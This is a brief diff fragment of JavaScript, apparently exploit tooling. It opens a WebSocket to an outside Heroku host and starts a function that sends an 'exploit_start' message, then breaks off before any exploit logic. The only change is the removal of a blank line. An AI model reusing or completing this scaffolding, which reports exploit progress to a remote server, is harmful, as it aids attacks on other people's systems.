@@ -1,5 +1,4 @@
 var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
-
 var keep = [];
 async function kickstart146() {
 	socket.send(`exploit_start {
